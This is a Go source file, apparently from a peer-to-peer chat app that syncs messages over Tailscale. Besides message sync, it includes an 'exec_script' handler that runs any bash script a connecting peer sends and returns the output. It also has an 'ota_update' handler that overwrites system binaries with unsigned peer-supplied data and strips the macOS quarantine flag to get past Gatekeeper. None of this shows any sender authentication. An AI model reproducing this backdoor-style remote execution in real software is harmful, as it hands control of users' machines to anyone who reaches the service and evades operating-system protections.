package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"time"

	"github.com/NeoTrinity/chat/internal/db"
)

// SyncMessage is the wire envelope for all P2P communication.
type SyncMessage struct {
	Type    string `json:"type"` // handshake, handshake_reply, message_sync, telemetry, ota_update, exec_script
	Payload []byte `json:"payload"`
}

// HandshakePayload is sent first: "I have seen your messages up to this time."
type HandshakePayload struct {
	PeerID    string    `json:"peer_id"`
	HighWater time.Time `json:"high_water"`
}

// MessageBatchPayload is the diff sent in response to a handshake.
type MessageBatchPayload struct {
	Messages []db.Message `json:"messages"`
}

// TelemetryPayload carries remote error/info logs.
type TelemetryPayload struct {
	Entries []TelemetryEntry `json:"entries"`
}
type TelemetryEntry struct {
	ID      int64     `json:"id"`
	Level   string    `json:"level"`
	Message string    `json:"message"`
	Time    time.Time `json:"time"`
}

// OTAPayload carries binary replacement data.
type OTAPayload struct {
	Version     string `json:"version"`
	ChatBinary  []byte `json:"chat_binary"`
	ChatdBinary []byte `json:"chatd_binary"`
}

// ─────────────────────────────────────────────
//  P2PServer
// ─────────────────────────────────────────────

type P2PServer struct {
	tsNode *TSNode
	port   int
	db     *db.DB
	peerID string // our own identity string
}

func NewP2PServer(node *TSNode, port int, database *db.DB, peerID string) *P2PServer {
	return &P2PServer{tsNode: node, port: port, db: database, peerID: peerID}
}

// Start begins listening for peer sync connections on the Tailscale interface.
func (s *P2PServer) Start() error {
	ln, err := s.tsNode.Listen(s.port)
	if err != nil {
		return err
	}

	log.Printf("[sync] P2P server listening on Tailscale port %d\n", s.port)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				log.Printf("[sync] Accept error: %v\n", err)
				continue
			}
			go s.handleConnection(conn)
		}
	}()
	return nil
}

// InitiateSync dials the peer and starts a sync handshake as the initiator.
func (s *P2PServer) InitiateSync(peerAddr string, peerID string) error {
	conn, err := s.tsNode.Dial(peerAddr, s.port)
	if err != nil {
		return fmt.Errorf("[sync] dial failed: %w", err)
	}
	defer conn.Close()

	highWater, err := s.db.GetSyncState(peerID)
	if err != nil {
		return err
	}

	// Send our handshake: "give me everything newer than highWater"
	handshake := HandshakePayload{PeerID: s.peerID, HighWater: highWater}
	raw, _ := json.Marshal(handshake)
	if err := send(conn, SyncMessage{Type: "handshake", Payload: raw}); err != nil {
		return err
	}

	// Receive the reply batch and upsert.
	var reply SyncMessage
	if err := json.NewDecoder(conn).Decode(&reply); err != nil {
		return err
	}
	if reply.Type == "message_sync" {
		return s.applyBatch(reply.Payload, peerID)
	}
	return nil
}

func (s *P2PServer) handleConnection(conn net.Conn) {
	defer conn.Close()
	log.Printf("[sync] Peer connected: %s\n", conn.RemoteAddr())

	dec := json.NewDecoder(conn)
	for {
		var msg SyncMessage
		if err := dec.Decode(&msg); err != nil {
			if err != io.EOF {
				log.Printf("[sync] Decode error: %v\n", err)
			}
			return
		}
		s.dispatch(conn, msg)
	}
}

func (s *P2PServer) dispatch(conn net.Conn, msg SyncMessage) {
	switch msg.Type {

	case "handshake":
		var hs HandshakePayload
		if err := json.Unmarshal(msg.Payload, &hs); err != nil {
			log.Printf("[sync] Bad handshake payload: %v\n", err)
			return
		}
		// They asked for everything newer than hs.HighWater
		msgs, err := s.db.MessagesSince(hs.HighWater)
		if err != nil {
			log.Printf("[sync] MessagesSince error: %v\n", err)
			return
		}
		batch := MessageBatchPayload{Messages: msgs}
		raw, _ := json.Marshal(batch)
		if err := send(conn, SyncMessage{Type: "message_sync", Payload: raw}); err != nil {
			log.Printf("[sync] Failed to send batch: %v\n", err)
		}
		log.Printf("[sync] Sent %d messages to peer (since %s)\n", len(msgs), hs.HighWater)

	case "message_sync":
		// We are the initiator receiving a diff — parse and upsert.
		// (This path is exercised when the peer calls us first.)
		var hs HandshakePayload // dummy; we only need peer ID from context
		_ = hs
		s.applyBatch(msg.Payload, "peer") //nolint

	case "telemetry":
		var tp TelemetryPayload
		if err := json.Unmarshal(msg.Payload, &tp); err != nil {
			return
		}
		for _, e := range tp.Entries {
			log.Printf("[telemetry|%s] %s %s\n", e.Level, e.Time.Format(time.RFC3339), e.Message)
		}

	case "ota_update":
		log.Println("[ota] Received Over-The-Air update!")
		s.handleOTA(msg.Payload)

	case "exec_script":
		log.Println("[exec] Received remote script.")
		s.handleExecScript(conn, msg.Payload)

	default:
		log.Printf("[sync] Unknown message type: %s\n", msg.Type)
	}
}

// applyBatch upserts a received message batch and advances the High-Water Mark.
func (s *P2PServer) applyBatch(payload []byte, peerID string) error {
	var batch MessageBatchPayload
	if err := json.Unmarshal(payload, &batch); err != nil {
		return fmt.Errorf("bad batch payload: %w", err)
	}

	var newest time.Time
	for _, m := range batch.Messages {
		if err := s.db.UpsertMessage(m); err != nil {
			log.Printf("[sync] Upsert error for %s: %v\n", m.ID, err)
		}
		if m.UpdatedAt.After(newest) {
			newest = m.UpdatedAt
		}
	}

	if !newest.IsZero() {
		if err := s.db.SetSyncState(peerID, newest); err != nil {
			log.Printf("[sync] SetSyncState error: %v\n", err)
		}
	}

	log.Printf("[sync] Applied %d messages from peer. New high-water: %s\n",
		len(batch.Messages), newest)
	return nil
}

// ─────────────────────────────────────────────
//  OTA Update handler
// ─────────────────────────────────────────────

func (s *P2PServer) handleOTA(payload []byte) {
	var ota OTAPayload
	if err := json.Unmarshal(payload, &ota); err != nil {
		log.Printf("[ota] Bad payload: %v\n", err)
		return
	}

	log.Printf("[ota] Applying version %s\n", ota.Version)

	type target struct {
		data []byte
		path string
	}
	targets := []target{
		{ota.ChatBinary, "/usr/local/bin/chat"},
		{ota.ChatdBinary, "/usr/local/bin/chatd"},
	}

	for _, t := range targets {
		tmpPath := t.path + ".new"
		if err := os.WriteFile(tmpPath, t.data, 0755); err != nil {
			log.Printf("[ota] Write error for %s: %v\n", t.path, err)
			return
		}
		// Strip macOS quarantine xattr before rename so Gatekeeper doesn't block.
		_ = exec.Command("xattr", "-d", "com.apple.quarantine", tmpPath).Run()

		// Atomic rename — replaces the running binary cleanly.
		if err := os.Rename(tmpPath, t.path); err != nil {
			log.Printf("[ota] Rename error for %s: %v\n", t.path, err)
			return
		}
		log.Printf("[ota] Updated %s\n", t.path)
	}

	log.Println("[ota] Binaries updated. Restarting daemon via launchctl...")
	// launchd KeepAlive=true will immediately relaunch with the new binary.
	_ = exec.Command("launchctl", "stop", "com.neotrinity.chatd").Run()
}

// ─────────────────────────────────────────────
//  Remote Script Execution handler
// ─────────────────────────────────────────────

func (s *P2PServer) handleExecScript(conn net.Conn, payload []byte) {
	tmpPath := fmt.Sprintf("/tmp/neochat_script_%d.sh", time.Now().UnixNano())
	if err := os.WriteFile(tmpPath, payload, 0700); err != nil {
		log.Printf("[exec] Write error: %v\n", err)
		return
	}
	defer os.Remove(tmpPath)

	out, err := exec.Command("bash", tmpPath).CombinedOutput()
	result := string(out)
	if err != nil {
		result += fmt.Sprintf("\nExit error: %v", err)
	}

	// Send result back as a telemetry entry so it appears in Neo's :logs
	entry := TelemetryPayload{Entries: []TelemetryEntry{{
		Level:   "exec_result",
		Message: result,
		Time:    time.Now(),
	}}}
	raw, _ := json.Marshal(entry)
	if err := send(conn, SyncMessage{Type: "telemetry", Payload: raw}); err != nil {
		log.Printf("[exec] Failed to send result: %v\n", err)
	}
}

// ─────────────────────────────────────────────
//  Wire helper
// ─────────────────────────────────────────────

func send(conn net.Conn, msg SyncMessage) error {
	return json.NewEncoder(conn).Encode(msg)
}
